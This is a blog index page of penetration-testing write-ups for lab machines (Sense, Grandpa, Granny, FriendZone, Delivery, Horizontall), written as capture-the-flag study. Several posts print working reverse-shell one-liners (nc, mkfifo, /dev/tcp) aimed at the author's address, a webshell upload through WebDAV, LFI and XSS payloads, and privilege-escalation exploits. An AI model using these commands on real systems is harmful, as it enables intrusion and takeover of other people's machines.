<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 6.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-Sense" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/07/24/Sense/" class="article-date">
  <time class="dt-published" datetime="2022-07-25T01:23:10.000Z" itemprop="datePublished">2022-07-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/07/24/Sense/">Sense</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><img src="/2022/07/24/Sense/nmap.png">
the home page is a login page

<h5 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h5><img src="/2022/07/24/Sense/dir1.png">
<img src="/2022/07/24/Sense/dir2.png">
the changelog.txt shows some message that we may can use
<img src="/2022/07/24/Sense/changelog.png">
all php pages need login

<h5 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h5><p>the gobuster <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_50854790/article/details/121576425">knowledge</a></p>
<pre><code>gobuster dir -u https://10.10.10.60 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x txt
</code></pre>
<ul>
<li>-k - 跳过SSL证书的验证</li>
<li>-x <extensions> - 要检查的扩展名列表（如果有）<img src="/2022/07/24/Sense/gobuster.png">
we can find a system-users.txt
<img src="/2022/07/24/Sense/system-users.png"></extensions></li>
</ul>
<p>the password we can guess is the default page - pfsense<br>username: Rohit<br>password: company defaults—-pfsense<br>and we success<br><img src="/2022/07/24/Sense/pfsense.png"></p>
<h5 id="search-sploit"><a href="#search-sploit" class="headerlink" title="search sploit"></a>search sploit</h5><p>we can find a 43560.py matches the pfsense 2.1.3<br>let’s have a try and we get a root access<br><img src="/2022/07/24/Sense/rootaccess.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/07/24/Sense/" data-id="cl6073erw0000dfcp3vruemkv" data-title="Sense" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Grandpa" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/07/22/Grandpa/" class="article-date">
  <time class="dt-published" datetime="2022-07-22T09:44:48.000Z" itemprop="datePublished">2022-07-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/07/22/Grandpa/">Grandpa</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><img src="/2022/07/22/Grandpa/nmap.png">
it looks like granny
<img src="/2022/07/22/Grandpa/dirsearch.png">
<img src="/2022/07/22/Grandpa/asp.png">

<h5 id="webDAV"><a href="#webDAV" class="headerlink" title="webDAV"></a>webDAV</h5><pre><code>davtest -url http://10.10.10.14
</code></pre>
<p>but it shows nothing can use<br><img src="/2022/07/22/Grandpa/davtest.png"></p>
<h5 id="IIS-6-0"><a href="#IIS-6-0" class="headerlink" title="IIS 6.0"></a>IIS 6.0</h5><p>the iis 6.0 is too old,so we can use msf&#x2F;searchsploit to search some exploits<br><img src="/2022/07/22/Grandpa/searchsploit.png"></p>
<h4 id="2-get-web-access"><a href="#2-get-web-access" class="headerlink" title="2.get web access"></a>2.get web access</h4><p>we can try to use <a target="_blank" rel="noopener" href="https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269">script</a><br><img src="/2022/07/22/Grandpa/pyscript.png"></p>
<pre><code>python2 iis6\ reverse\ shell 10.10.10.14 80 10.10.16.10 8888
</code></pre>
<img src="/2022/07/22/Grandpa/webshell.png">
but all users directory we all can't get in
<img src="/2022/07/22/Grandpa/accessdeny.png">

<h4 id="3-get-root-access"><a href="#3-get-root-access" class="headerlink" title="3.get root access"></a>3.get root access</h4><p>we can try many path to write</p>
<pre><code>echo test &gt; test.txt
</code></pre>
<p>but many directory failed<br>in the root directory,we can find a unique dir called wmpub<br><img src="/2022/07/22/Grandpa/wmpub.png"><br>and we can success write into this directory<br><img src="/2022/07/22/Grandpa/wmpubwrite.png"><br><code>icacles</code> shows that as well:<br><img src="/2022/07/22/Grandpa/icacls.png"><br>That Userss can <code>WD</code> decodes to write data&#x2F;add files.<br>use systeminfo and <a target="_blank" rel="noopener" href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">windows-exploit-suggester</a> to find if there is something can use<br>    pip2 install xlrd&#x3D;&#x3D;1.2.0<br>    python2 windows-exploit-suggester.py -i systeminfo.txt –database 2022-07-22-mssb.xls<br><img src="/2022/07/22/Grandpa/suggest1.png"><br><img src="/2022/07/22/Grandpa/suggest2.png"><br>but these don’t work<br>check the privs<br><img src="/2022/07/22/Grandpa/suggest2.png"><br><code>SEImpersonalPrivilege</code> is one I know to look out for. For modern boxes, that means a potato exploit (juicy, lonely, rotten). But for 2003, it’s better to start with <a target="_blank" rel="noopener" href="https://github.com/Re4son/Churrasco/">churrasco</a>.</p>
<h5 id="churrasco"><a href="#churrasco" class="headerlink" title="churrasco"></a>churrasco</h5><p>first,make a smb directory and put the churrasco.exe into it<br><img src="/2022/07/22/Grandpa/smbpack.png"><br>second,use<code>impack-smbserver smb smb</code> to start a smb server to let the target machine get the churrasco.exe<br>we should made sure the Churrasco.exe file was in a directory called SMB on Kali machine.<br><img src="/2022/07/22/Grandpa/smbserver.png"><br>now we can use target machine to connect our smbshare <code>net use \\10.10.16.10\smb</code><br><img src="/2022/07/22/Grandpa/netuse.png"><br>once we connected,use <code>copy \\10.10.16.10\smb\churrasco.exe</code> and <code>copy \\10.10.16.10\smb\nc.exe</code><br><img src="/2022/07/22/Grandpa/smbcopy.png"><br><img src="/2022/07/22/Grandpa/smbcopy2.png"><br>Once the files are copied, execute churrasco with the following command: .\churrasco.exe “C:\wmpub\nc.exe -e cmd.exe 10.10.16.10 8999”<br>And we get the root access</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/07/22/Grandpa/" data-id="cl5zdl9n00000y5cp5m8vg19h" data-title="Grandpa" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Granny" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/07/21/Granny/" class="article-date">
  <time class="dt-published" datetime="2022-07-21T11:25:32.000Z" itemprop="datePublished">2022-07-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/07/21/Granny/">Granny</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><img src="/2022/07/21/Granny/nmap.png">
it just open port 80,and the web page is a default error page
<img src="/2022/07/21/Granny/webpage.png">
the header shows that it's a ASP.NET,so if we can upload aspx files to it,it can excute
<img src="/2022/07/21/Granny/asp.png">
use dirsearch to dig pages
<img src="/2022/07/21/Granny/dirsearch.png">

<h5 id="webDAV"><a href="#webDAV" class="headerlink" title="webDAV"></a>webDAV</h5><p>Web Distributed Authoring and Versioning (WebDAV) is an HTTP extension designed to allow people to create and modify web sites using HTTP.<br><img src="/2022/07/21/Granny/webDAV.png"><br>we can use <a href>davtest</a> to explore further, and it will show me what types of files can be uploaded, and if it can create a directory:</p>
<pre><code>davtest -url http:10.10.10.15
</code></pre>
<img src="/2022/07/21/Granny/davtest.png">
It looks like there are a lot of file type I can upload, but not aspx, which is what I want.
The next step is to manul test dav
First, I’ll put up a text file and verify it’s there:

<pre><code>echo &quot;it&#39;s a test text&quot; &gt; test.txt
curl -X PUT http://10.10.10.15/123.txt -d @test.txt
curl http://10.10.10.15/123.txt
</code></pre>
<img src="/2022/07/21/Granny/curl.png">
The first curl puts the file onto the webserver, and the second proves it’s there. The -d @123.txt syntax says that the data for the request should be the contents of the file text.txt.
Now let's try with .aspx:
<img src="/2022/07/21/Granny/aspx.png">
unfortunately,it's really can't allow us to upload aspx

<p>There’s a tool called <code>cadaver</code> that provides command-line WebDAV interactions with a slightly simpler syntax than curl. If I are going to be attacking a WebDAV server, I’ll probably use that just for the shorter commands. That said, I’m going to use <code>curl</code> in this post to show exactly what is happening when I issue these HTTP requests.<br><a target="_blank" rel="noopener" href="https://linux.die.net/man/1/cadaver">cadaver</a></p>
<h4 id="2-get-webshell-access"><a href="#2-get-webshell-access" class="headerlink" title="2.get webshell access"></a>2.get webshell access</h4><p>Kali has a simple one at <code>/usr/share/webshells/aspx/cmdasp.aspx</code>, we should copy it </p>
<pre><code>cp /usr/share/webshells/aspx/cmdasp.aspx .
</code></pre>
<p>And now we can upload that to target as a txt using curl and the http put method:</p>
<pre><code>curl -X PUT http://10.10.10.15/shell.txt -d @cmdasp.aspx
</code></pre>
<p>we can see the site deal the shell as the plain text<br><img src="/2022/07/21/Granny/shelltxt.png"><br>Now we can use the next webdav command, MOVE. Again, I can do this with curl:</p>
<pre><code>curl -X MOVE -H &#39;Destination:http://10.10.10.15/shell.aspx&#39; http://10.10.10.15/shell.txt
</code></pre>
<ul>
<li>-X MOVE - use the MOVE method</li>
<li>-H ‘Destination:<a target="_blank" rel="noopener" href="http://10.10.10.15/shell.aspx&#39;">http://10.10.10.15/shell.aspx&#39;</a> - defines where to move to</li>
<li><a target="_blank" rel="noopener" href="http://10.10.10.15/shell.txt">http://10.10.10.15/shell.txt</a> - the file to move<br>and now we can get a shell<img src="/2022/07/21/Granny/webshell.png"></li>
</ul>
<h5 id="reverse-a-shell"><a href="#reverse-a-shell" class="headerlink" title="reverse a shell"></a>reverse a shell</h5><p>using msf,we can reverse a shell</p>
<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.10 LPORT=4444 -f aspx &gt; msf.aspx
</code></pre>
<p>like the step before,upload it and change it to aspx:</p>
<pre><code>curl -X PUT http://10.10.10.15/msf.txt -d @msf.aspx
curl -X MOVE -H &#39;Destination: http://10.10.10.15/msf.aspx&#39; http://10.10.10.15/msf.txt
</code></pre>
<p>start msf</p>
<pre><code>use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
</code></pre>
<p>try to trigger it,but failed<br><img src="/2022/07/21/Granny/fail.png"><br>upload it again,and we will see the whitespace is all jacked up:<br><img src="/2022/07/21/Granny/whitespace.png"><br>upload again and use <code>--data-binary</code> to preserve endlines and other control characters</p>
<pre><code>curl -X PUT http://10.10.10.15/msf.txt --data-binary @msf.aspx
</code></pre>
<p>and this time we can see it cleaner:<br><img src="/2022/07/21/Granny/msf.png"></p>
<pre><code>curl -X MOVE -H &#39;Destination: http://10.10.10.15/msf.aspx&#39; http://10.10.10.15/msf.txt
</code></pre>
<p>trigger it,and we can get s shell<br><img src="/2022/07/21/Granny/shell.png"></p>
<h4 id="3-get-root-access"><a href="#3-get-root-access" class="headerlink" title="3.get root access"></a>3.get root access</h4><p>First to checkout local exploits, and Metasploit has a nice module for that, <code>post/multi/recon/local_exploit_suggester</code><br><img src="/2022/07/21/Granny/localsuggest.png"><br>and we can use ms14-058<br>finally,we get the root<br><img src="/2022/07/21/Granny/root.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/07/21/Granny/" data-id="cl5v6ykmy0004yacpai0i30w0" data-title="Granny" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-FriendZone" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/07/19/FriendZone/" class="article-date">
  <time class="dt-published" datetime="2022-07-20T03:34:51.000Z" itemprop="datePublished">2022-07-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/07/19/FriendZone/">FriendZone</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><img src="/2022/07/19/FriendZone/nmap.png">
the machine opnes ftp,ssh,smbd and ssl
the port 80 just a picture

<h5 id="SMB-shares-445-x2F-139"><a href="#SMB-shares-445-x2F-139" class="headerlink" title="SMB shares 445&#x2F;139"></a>SMB shares 445&#x2F;139</h5><p>first use smbmap to list shares and permissions</p>
<pre><code>smbmap -H 10.10.10.123
</code></pre>
<img src="/2022/07/19/FriendZone/smbscan.png">
it can also get using smbclient

<pre><code>smbclient -N -L //10.10.10.123
</code></pre>
<p>-N represent null session (or no auth) and -L to list<br><img src="/2022/07/19/FriendZone/smbclient.png"><br>the comment of Files says that its &#x2F;etc&#x2F;Files<br>so we can use nmap to verify</p>
<pre><code>nmap --script smb-enum-shares.nse -p445 10.10.10.123
</code></pre>
<img src="/2022/07/19/FriendZone/nmapscript.png">
it will give me the path on target to the share

<h6 id="Development"><a href="#Development" class="headerlink" title="Development"></a>Development</h6><p>The Development share is empty:<br><img src="/2022/07/19/FriendZone/Development.png"></p>
<h6 id="general"><a href="#general" class="headerlink" title="general"></a>general</h6><p>The general share has a single file,we can get it and have a look<br><img src="/2022/07/19/FriendZone/general.png"><br>its a cred<br><img src="/2022/07/19/FriendZone/cred.png"></p>
<h5 id="TCP-80"><a href="#TCP-80" class="headerlink" title="TCP 80"></a>TCP 80</h5><p>the site give us a new domain <code>friendzoneportal.red</code><br>we now use dirsearch to find some paths<br><img src="/2022/07/19/FriendZone/dirsearch.png"><br>the robots.txt just a phrase<br><img src="/2022/07/19/FriendZone/robots.png"><br>and the wordpress is empty dir</p>
<h5 id="https-443"><a href="#https-443" class="headerlink" title="https 443"></a>https 443</h5><p>first use the comman name get via nmap to visit <code>https://friendzone.red:443/</code><br>the site just has a picture<br><img src="/2022/07/19/FriendZone/443pic.png"><br>and if we view page source,we can get another path<br><img src="/2022/07/19/FriendZone/443.png"><br>the js&#x2F;js path has a encode string,so we can try to decode it<br><img src="/2022/07/19/FriendZone/jsjs.png"><br>it also have a hint<br><img src="/2022/07/19/FriendZone/jshint.png"><br>i temporarily don’t know what’s the meaning of it</p>
<h5 id="TCP-x2F-UDP-53"><a href="#TCP-x2F-UDP-53" class="headerlink" title="TCP&#x2F;UDP 53"></a>TCP&#x2F;UDP 53</h5><p>TCP is only used in DNS when the response size is greater than 512 bytes. Typically this is associated with Zone Transfers, where the server give all the information it has for a domain. There’s a few things I could try to enumerate DNS, but the fact that the host is listening on TCP 53 suggests the first thing I should try is a Zone Transfer.<br>I’ll do that with dig. I’ll start with friendzone.htb, and get nothing:<br><img src="/2022/07/19/FriendZone/dig1.png"><br>Since I have a domain name in the TLS certificate, I’ll try that:<br><img src="/2022/07/19/FriendZone/dig2.png"><br>I can also try the domain I got on the first webpage, “friendzoneportal.red”:<br><img src="/2022/07/19/FriendZone/dig3.png"><br>I’ll update my hosts file for each of these:<br><img src="/2022/07/19/FriendZone/host.png"></p>
<h5 id="administrator1-friendzone-red"><a href="#administrator1-friendzone-red" class="headerlink" title="administrator1.friendzone.red"></a>administrator1.friendzone.red</h5><img src="/2022/07/19/FriendZone/login1.png">
use the creds we get ,and we can in 
<img src="/2022/07/19/FriendZone/logindone.png">
visit /dashboard.php ,and we can find something else
<img src="/2022/07/19/FriendZone/dashboard.png">
we add the `?image_id=a.jpg&pagename=timestamp` to the path,and we can get another page
<img src="/2022/07/19/FriendZone/dashboardpic.png">
use dirsearch to search the path
<img src="/2022/07/19/FriendZone/dirsearch2.png">
it's has a image dir and has two pics
and it's also has a page called timestamp.php

<h4 id="2-get-webshell-access"><a href="#2-get-webshell-access" class="headerlink" title="2.get webshell access"></a>2.get webshell access</h4><h5 id="Find-LFI"><a href="#Find-LFI" class="headerlink" title="Find LFI"></a>Find LFI</h5><p>because the pic is load by the full path,we can try to find load file inclusion<br>1.image_id<br>The image_id, such as a.jpg is a full file name. I’ll try giving it a php page, which it would load if that file is being shown using include in php. Unfortunately, it just shows a broken image:<br><img src="/2022/07/19/FriendZone/lfi1.png"><br>Looking at the source, I see <code>&lt;img src=&#39;images/timestamp.php&#39;&gt;</code>. I could play with XSS here, and see if I can get it to load a script. For example, if I set <code>image_id=&#39; onerror=&#39;javascript: alert(&quot;XXS HERE&quot;);</code>, I get a pop-up:<br><img src="/2022/07/19/FriendZone/xss.png"><br>The source explains it: <code>&lt;img src=&#39;images/&#39; onerror=&#39;javascript: alert(&quot;XXS HERE&quot;);&#39;&gt;</code><br>2.pagename<br>Since the given example case is <code>timestamp</code>, and there’s a <code>timestamp.php</code> in the same directory, I can assume that this is likely doing a <code>include($_GET[&quot;pagename&quot;] . &quot;.php&quot;)</code>. I can test this by having it point to other php pages.<br>Visiting <code>https://administrator1.friendzone.red/login.php</code> returns: <code>Wrong!</code><br>and we change to pagename to login can also see the same word<br><img src="/2022/07/19/FriendZone/wrong.png"></p>
<h5 id="read-PHP-resource"><a href="#read-PHP-resource" class="headerlink" title="read PHP resource"></a>read PHP resource</h5><p>I can use this LFI to read source code for these pages using php filters. If I visit <code>pagename=php://filter/convert.base64-encode/resource=dashboard</code>, I can see a long base64 string on the page:<br><img src="/2022/07/19/FriendZone/base64.png"><br>decoding it,and we can find something<br><img src="/2022/07/19/FriendZone/sourcecode.png"><br>we can do the same thing to read upload <code>pagename=php://filter/convert.base64-encode/resource=../uploads/upload</code><br><img src="/2022/07/19/FriendZone/uploadsource.png"></p>
<h5 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h5><p>I want to use this LFI to include a webshell so I can run commands. I’ll use my smb access to drop a simple php command shell into the Development share, which nmap told me was &#x2F;etc&#x2F;Development.<br><img src="/2022/07/19/FriendZone/cmdphp.png"><br>and upload it to the machine</p>
<pre><code>smbclient -N //10.10.10.123/Development -c &#39;put cmd.php zyz.php&#39;
</code></pre>
<img src="/2022/07/19/FriendZone/zyzphp.png">
Now, on visiting `https://administrator1.friendzone.red/dashboard.php?image_id=&pagename=../../../etc/Development/zyz&cmd=id`, I get output:
<img src="/2022/07/19/FriendZone/webshell.png">

<p> I’ll use my go to from the <a target="_blank" rel="noopener" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse Shell Cheat Sheet</a> and visit: <code>https://administrator1.friendzone.red/dashboard.php?image_id=&amp;pagename=../../../etc/Development/zyz&amp;cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;%261|nc 10.10.16.10 4444 &gt;/tmp/f</code> (remembering to encode the &amp; as %26):<br><img src="/2022/07/19/FriendZone/reverse.png"><br>After a shell upgrade <code>(python -c &#39;import pty;pty.spawn(&quot;bash&quot;)&#39;</code>, <code>ctrl-z</code>, <code>stty raw -echo;fg</code>, <code>reset</code>, enter “screen” for terminal type if asked), I’ve got a full shell. And I can get user.txt.<br>In the &#x2F;var&#x2F;www&#x2F; directory, there’s folders for all the different sites, as well as an sql conf file:<br><img src="/2022/07/19/FriendZone/mysql.png"><br>use the password to su friend<br><img src="/2022/07/19/FriendZone/friend.png"></p>
<h4 id="3-get-root-access"><a href="#3-get-root-access" class="headerlink" title="3.get root access"></a>3.get root access</h4><p>search around the machine, there has a py script in &#x2F;opt&#x2F;server_admin<br><img src="/2022/07/19/FriendZone/pyscript.png"><br>find &#x2F;tmp can write to upload our <a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy">pspy</a></p>
<pre><code>our machine:python3 -m http.server 80
target machine:wget http://10.10.16.10/pspy32s
               chmod +x pspy32s
       ./pspy32s
</code></pre>
<p>and we can find that root was running this script every two minutes:<br><img src="/2022/07/19/FriendZone/script.png"><br>via linpeas.sh,we find a file that friend can write<br><img src="/2022/07/19/FriendZone/friendcanwrite.png"><br>we append the following scripts to the end of it<br><img src="/2022/07/19/FriendZone/append.png"><br>and finally we get the root<br><img src="/2022/07/19/FriendZone/rootflag.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/07/19/FriendZone/" data-id="cl5v6ykmx0003yacp45o1bu8e" data-title="FriendZone" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Delivery" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/07/18/Delivery/" class="article-date">
  <time class="dt-published" datetime="2022-07-18T14:00:34.000Z" itemprop="datePublished">2022-07-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/07/18/Delivery/">Delivery</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><img src="/2022/07/18/Delivery/nmap.png">
and add helpdesk.delivery.htb to /etc/hosts

<pre><code>echo &quot;10.10.10.222 helpdesk.delivery.htb&quot; &gt;&gt; /etc/hosts
</code></pre>
<h4 id="2-website"><a href="#2-website" class="headerlink" title="2.website"></a>2.website</h4><p>the port 80 shows nothing,but we can change to <a target="_blank" rel="noopener" href="http://helpdesk.delivery.htb/index.php">http://helpdesk.delivery.htb/index.php</a> to get some information<br><img src="/2022/07/18/Delivery/osTicket.png"><br>it shows it’s run a osTicket structer on 80<br>and on port 8065,it shows another login page<br><img src="/2022/07/18/Delivery/mattermost.png"><br>i first add a user in mattermost and try to find a exploit<br>it need me to varify<br>so let’s use searchsploit osticket and try to exploit<br>all the register need verify<br>as a guest,we can open a new ticket and see it’s feedback<br><img src="/2022/07/18/Delivery/newticket.png"></p>
<h4 id="3-getting-webshell-access"><a href="#3-getting-webshell-access" class="headerlink" title="3.getting webshell access"></a>3.getting webshell access</h4><p>because the machine can not access to the internet,the verify step is unable<br>but when I created a ticket, it offered the ability to update the ticket over email. I can use that to get the verification email.<br><img src="/2022/07/18/Delivery/viewticket.png"><br>I’ll create a ticket and get the email address for it. Then sign up for a MatterMost account:<br><img src="/2022/07/18/Delivery/step1.png"><br><img src="/2022/07/18/Delivery/step2.png"><br>the default email is <a href="mailto:&#x32;&#x32;&#48;&#x30;&#52;&#57;&#x33;&#64;&#x64;&#x65;&#x6c;&#105;&#118;&#101;&#114;&#x79;&#x2e;&#104;&#116;&#98;">&#x32;&#x32;&#48;&#x30;&#52;&#57;&#x33;&#64;&#x64;&#x65;&#x6c;&#105;&#118;&#101;&#114;&#x79;&#x2e;&#104;&#116;&#98;</a><br>register a new account use <a href="mailto:&#50;&#x32;&#48;&#x30;&#x34;&#57;&#x33;&#x40;&#100;&#x65;&#108;&#x69;&#x76;&#101;&#x72;&#x79;&#x2e;&#104;&#116;&#98;">&#50;&#x32;&#48;&#x30;&#x34;&#57;&#x33;&#x40;&#100;&#x65;&#108;&#x69;&#x76;&#101;&#x72;&#x79;&#x2e;&#104;&#116;&#98;</a><br><img src="/2022/07/18/Delivery/step3.png"><br>check the ticketnum use 2200493<br><img src="/2022/07/18/Delivery/step4.png"><br>and now we get the verify mail<br><img src="/2022/07/18/Delivery/step5.png"><br>verify the link and we can get in<br><img src="/2022/07/18/Delivery/step6.png"><br>in the website,we can see a credential —maildeliverer:Youve_G0t_Mail!<br>and it shows a hint that may password are PleaseSubscribe!<br><img src="/2022/07/18/Delivery/creds.png"><br>then i can try to use creds i just get to ssh the machine<br><img src="/2022/07/18/Delivery/userflag.png"></p>
<h4 id="4-getting-root-access"><a href="#4-getting-root-access" class="headerlink" title="4.getting root access"></a>4.getting root access</h4><p>Mattermost stores it’s configuration in &#x2F;opt&#x2F;mattermost&#x2F;config&#x2F;config.json. The database connection information is in here:<br><img src="/2022/07/18/Delivery/sqlpass.png"></p>
<p>username:mmuser<br>password:Crack_The_MM_Admin_PW<br>database:mattermost<br><img src="/2022/07/18/Delivery/database.png"><br>we can get username and password from the table User</p>
<pre><code>select Username,Password from Users;
</code></pre>
<img src="/2022/07/18/Delivery/Users.png">

<h5 id="crack-root-password"><a href="#crack-root-password" class="headerlink" title="crack root password"></a>crack root password</h5><p>we can save the hash to a file and save the hint PleaseSubscribe! to another file<br><img src="/2022/07/18/Delivery/hashcrack.png"><br>and the result is PleaseSubscribe!21<br><img src="/2022/07/18/Delivery/result.png"><br>finally,we get the root<br><img src="/2022/07/18/Delivery/root.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/07/18/Delivery/" data-id="cl5v6ykmu0001yacp9bm36zuu" data-title="Delivery" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Horizontall" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/07/17/Horizontall/" class="article-date">
  <time class="dt-published" datetime="2022-07-17T14:08:02.000Z" itemprop="datePublished">2022-07-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/07/17/Horizontall/">Horizontall</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><p>first we add the host to &#x2F;etc&#x2F;hosts</p>
<pre><code>echo &quot;10.10.11.105 horizontall.htb&quot; &gt;&gt; /etc/hosts
</code></pre>
<img src="/2022/07/17/Horizontall/nmap.png">

<h4 id="2-getting-web-access"><a href="#2-getting-web-access" class="headerlink" title="2.getting web access"></a>2.getting web access</h4><p>the website don’t have any button can link to other pages<br>the page has two js file,and we can read them to find something<br><img src="/2022/07/17/Horizontall/js1.png" width="70%"><br><img src="/2022/07/17/Horizontall/js2.png" width="100%"></p>
<p>The JavaScript in app.c68eb462.js is minified, but tossing it into a <a target="_blank" rel="noopener" href="https://www.qianbo.com.cn/Tool/Beautify/Js-Formatter.html">jsFormatter</a> returns 654 lines of JavaScript. Glancing through it, this section jumped out because it reveals a subdomain:<br><img src="/2022/07/17/Horizontall/access.jpg" width="70%"></p>
<p>after this,i also use firsearch and fuzz to test the website,but we don’t have some useful information<br>so we first add the <code>api-prod.horizontall.htb</code> to &#x2F;etc&#x2F;hosts</p>
<pre><code>echo &quot;10.10.11.105 api-prod.horizontall.htb&quot; &gt;&gt; /etc/hosts
</code></pre>
<p>and visit the page and use dirsearch the site,we can see some admin pages and a &#x2F;reviews page<br><img src="/2022/07/17/Horizontall/dirsearch.png" width="70%"><br>the reviews page returns a json string<br><img src="/2022/07/17/Horizontall/json.png" width="70%"><br>in the admin page,we know it build with strapi<br>we can use searchsploit to search and use msfconsole to make some exploit<br><img src="/2022/07/17/Horizontall/strapi.png" width="70%"><br>we can see the poc and get the way to know the version<br><img src="/2022/07/17/Horizontall/getversion.png" width="70%"><br><img src="/2022/07/17/Horizontall/curl.png" width="70%"><br>the version greatly match the exploit,so we can try to change the password<br><img src="/2022/07/17/Horizontall/web.png" width="70%"><br>we can use the command to reverse a shell</p>
<pre><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.15/8888 0&gt;&amp;1&#39;
</code></pre>
<img src="/2022/07/17/Horizontall/shell.png" width="70%">
and use the command to get a interactive shell

<pre><code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
</code></pre>
<p>in the <code>/home/developer</code>,we don’t have permission</p>
